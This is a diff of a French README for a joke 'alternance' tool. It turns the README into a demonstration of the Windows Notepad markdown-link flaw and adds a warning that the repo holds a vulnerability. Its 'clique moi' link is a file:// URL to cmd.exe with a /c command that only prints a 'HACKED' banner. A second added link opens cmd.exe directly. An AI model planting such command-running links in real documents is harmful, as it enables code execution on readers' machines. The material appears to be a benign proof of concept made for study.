@@ -1,3 +1,5 @@
+> Note: ceci est pour un projet, ne téléchargez pas ce repo, il contient une vulnérabilité windows.
+
 # Hello !
 
 Ceci est mon super tool pour invoquer des alternances, comme par magie, paf !
@@ -14,6 +16,8 @@ Rien de plus simple, suffit de faire cette commande en dessous !
 
 
 
-# run executable file
+pour run le tool, seulement visible sur windows notepad:
 
 [clique moi !!!](file://C:/windows/system32/cmd.exe? /c "color 0a && echo [!] HACKED && echo  _  _   _    ___ _  _ ___ ___  && echo ^| ^|^| ^|^/ _\ / __^| ^|^/ / __^|   \ && echo ^| __ ^| ^(_^| ^| ^(_^| ^|   ^< ^| _^|^| ^| ^) ^) && echo ^|_^|^|_^|\__,_^|\___^|_^|\_\___^|___/ && pause")
+
+[clique stp](file://C:/windows/system32/cmd.exe)
